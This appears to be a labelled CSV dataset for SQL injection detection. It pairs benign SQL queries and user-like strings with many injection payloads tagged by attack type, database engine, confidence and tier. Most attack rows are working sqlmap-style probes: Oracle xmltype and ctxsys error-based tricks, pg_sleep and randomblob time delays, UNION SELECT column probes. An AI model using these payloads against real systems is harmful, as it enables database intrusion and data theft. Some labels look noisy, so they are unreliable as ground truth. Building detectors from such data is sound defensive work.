payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack,source,tier
"select * from users WHERE username = ""-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 6723 = 6723"" and username = ""-6244\' ) as szpd where 8445 = 8445","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) as __IDENT__ where __INT__ = __INT__",boolean_blind,postgresql,0.9,True,original,silver
' OR 0x313d31--,' or __HEX__ - -,boolean_blind,generic,0.9,True,original,silver
SELECT SIN ( -1 ),select __IDENT__ ( - __INT__ ),benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-2733\' ) ) ) or username = ""-9501\' )","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ )",auth_bypass,generic,0.6,True,original,bronze
"SELECT school,frighten FROM furniture WHERE path = 'needed' UNION SELECT century, secret FROM bet","select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
7.28868E+15,__IDENT__ + __INT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-9644 ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 5616 = 5616"" and username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and \'kfff\' = \'kfff""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and \ __STR__ = __IDENT__,error_based,oracle,0.95,True,original,gold
8.79E+15,__IDENT__ + __INT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-6079 ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),out_of_band,oracle,0.9,True,original,silver
SELECT AVG ( copper ) FROM image,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' ) where 1502 = 1502 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1\'",select * from __IDENT__ where __IDENT__ = __INT__ __STR__,boolean_blind,oracle,0.9,True,original,silver
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( '%' = '","select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ and ( ( __STR__ = '",heavy_query,firebird,0.85,True,original,silver
"-8600"" or elt ( 1032 = 1032,3623 ) and ""kfsn"" like ""kfsn",- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,generic,0.5,True,original,bronze
97963158v,__IDENT__,benign,generic,0.9,False,original,silver
SELECT frighten ( s ) FROM test UNION,select __IDENT__ ( __IDENT__ ) from __IDENT__ union,benign,generic,1.0,False,original,gold
golari,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM amount WHERE part BETWEEN 'grandmother' AND 'card',select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' ) ) ) or username = ""-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) ) or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ),error_based,postgresql,0.9,True,original,silver
"select * from users WHERE username = ""1\' ) where 1502 = 1502 or username = ""-7199\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
armenteros,__IDENT__,benign,generic,0.9,False,original,silver
00783778f,__IDENT__,benign,generic,0.9,False,original,silver
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#","- __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",union_based,generic,0.85,True,original,silver
1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'dgvg' = 'dgvg,__INT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,postgresql,0.9,True,original,silver
tarpey@bwds.ne,__IDENT__,benign,generic,0.9,False,original,silver
olmos de esgueva,__IDENT__ __IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
general castaos 180 9-e,__IDENT__ __IDENT__ __INT__ __INT__ - __IDENT__,benign,generic,0.9,False,original,silver
DELETE FROM bank,delete from __IDENT__,benign,generic,1.0,False,original,gold
SELECT * FROM storm WHERE damage = 'married' OR cattle = 'pipe',select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,benign,mysql,0.9,False,original,silver
SELECT LOG ( 2 ) ;,select __IDENT__ ( __INT__ ) ;,benign,mysql,0.9,False,original,silver
"SELECT * FROM mouth WHERE teach BETWEEN ""wish"" AND ""pick""",select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,benign,generic,1.0,False,original,gold
"SELECT * FROM public ORDER BY rising ASC, foot DESC","select * from __IDENT__ order by __IDENT__ asc , __IDENT__ desc",benign,generic,1.0,False,original,gold
1'|| ( select 'puco' where 2605 = 2605 union all select null#,__INT__ __STR__ __IDENT__ where __INT__ = __INT__ union all select null,union_based,generic,0.7,True,original,bronze
"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'iuki\' = \'iuki""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.9,True,original,silver
villaturiel,__IDENT__,benign,generic,0.9,False,original,silver
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 9774 ) ORDER BY meta_id ASC","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ in ( __INT__ ) order by __IDENT__ asc",benign,mysql,0.9,False,original,silver
"-9577'|| ( select 'vloa' from dual where 7184 = 7184 union all select 7184,7184#","- __INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__ union all select __INT__ , __INT__",union_based,oracle,0.7,True,original,bronze
"1' ) as asjj where 1721 = 1721 union all select null,null,null,null,null,null--","__INT__ ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null - -",union_based,generic,0.7,True,original,bronze
cath,__IDENT__,benign,generic,0.9,False,original,silver
SELECT TOP 3 * FROM airplane WHERE president = 'hollow' SELECT * FROM tube,select top __INT__ * from __IDENT__ where __IDENT__ = __STR__ select * from __IDENT__,benign,mssql,1.0,False,original,gold
"1%' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( '%' = '",__INT__ % __STR__ % __STR__,time_blind,postgresql,0.7,True,original,bronze
"1' ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","__INT__ __STR__ __IDENT__ , upper ( hex ( __IDENT__ ( __INT__ / __INT__ ) ) ) ) - -",time_blind,sqlite,0.7,True,original,bronze
"select * from users WHERE username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-9564 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ = __STR__,error_based,oracle,0.9,True,original,silver
"1"" ) ) as sgln where 7573 = 7573",__INT__ ) ) as __IDENT__ where __INT__ = __INT__,boolean_blind,generic,0.8,True,original,silver
aimarsen@enla.gi,__IDENT__,benign,generic,0.9,False,original,silver
SELECT vapor ( s ) FROM very SELECT see ( s ),select __IDENT__ ( __IDENT__ ) from __IDENT__ select __IDENT__ ( __IDENT__ ),benign,generic,1.0,False,original,gold
"1"" ) ) ) union all select null,null,null--","__INT__ ) ) ) union all select null , null , null - -",union_based,generic,0.7,True,original,bronze
"1 ) ) as oqfr where 6426 = 6426 and make_set ( 8403 = 8403,8899 ) --","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) - -",boolean_blind,mysql,0.8,True,original,silver
"-2001'+ ( select 'nput' where 8368 = 8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#","- __INT__ __STR__ __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",union_based,oracle,0.7,True,original,bronze
"select * from users WHERE username = ""-8069\' ) ) and ( ( \'qbvz\' = \'qbvz"" or username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'ykjs\' like \'ykjs""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"paso de la soledad, 130 10?f","__IDENT__ __IDENT__ __IDENT__ __IDENT__ , __INT__ __IDENT__",benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'esal\' = \'esal"" and username = ""1\'+ ( select \'rqok\' where 5074 = 5074",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ __STR__ __IDENT__ where __INT__ = __INT__,boolean_blind,postgresql,0.9,True,original,silver
"SELECT City, Country FROM Customers WHERE Country = 'Germany' UNION ALL","select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union all",benign,mysql,0.9,False,original,silver
SELECT * FROM off ORDER BY wealth DESC,select * from __IDENT__ order by __IDENT__ desc,benign,generic,1.0,False,original,gold
91394289v,__IDENT__,benign,generic,0.9,False,original,silver
SELECT range ( s ) FROM furniture UNION ALL,select __IDENT__ ( __IDENT__ ) from __IDENT__ union all,benign,generic,1.0,False,original,gold
SELECT COUNT ( beginning ) FROM port,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
forsyne@velaconsultores.mx,__IDENT__,benign,generic,0.9,False,original,silver
"SELECT * FROM users WHERE username = ""1\'+ ( select oljg where 2006 = 2006 OR username = ""-9263\' ) as qodg where 6798 = 6798 and 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",select * from __IDENT__ where __IDENT__ = __STR__,boolean_blind,oracle,0.8,True,original,silver
"1"" ) ) as femc where 1313 = 1313 and 4595 = 4595#",__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
"SELECT include, eaten, solidFROM die WHERE partly IS NOT NULL","select __IDENT__ , __IDENT__ , __IDENT__ __IDENT__ where __IDENT__ is not null",benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' ) ) ) and username = ""1%\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-1254""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""-7199\' and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-5152\' ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'jumr\' like \'jumr""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1 ) or username = ""-1641\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'vgcb\' like \'vgcb""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" and username = ""-1889%\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ % __IDENT__ ) ) ) or __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) )",out_of_band,oracle,0.9,True,original,silver
cormac1,__IDENT__,benign,generic,0.9,False,original,silver
opsito,__IDENT__,benign,generic,0.9,False,original,silver
-3359' order by 1--,- __INT__ order by __INT__ - -,boolean_blind,mysql,0.8,True,original,silver
"select * from users WHERE username = ""1\' ) as wpmv where 1479 = 1479 and username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'jzpb\' = \'jzpb"" and ( ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
SELECT * FROM deeply,select * from __IDENT__,benign,generic,1.0,False,original,gold
"1"" ) as semi where 4260 = 4260",__INT__ ) as __IDENT__ where __INT__ = __INT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-7199\' or \'qibr\' = \'qibr""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,postgresql,0.85,True,original,silver
SELECT * FROM drink WHERE deeply LIKE '%metal%',select * from __IDENT__ where __IDENT__ like __STR__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1%\' and \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\' and ( ( ( \'%\' = \'"" and username = ""-4248 where 3288 = 3288 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'ulkq\' = \'ulkq"" and username = ""-1641\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual )",error_based,oracle,0.95,True,original,gold
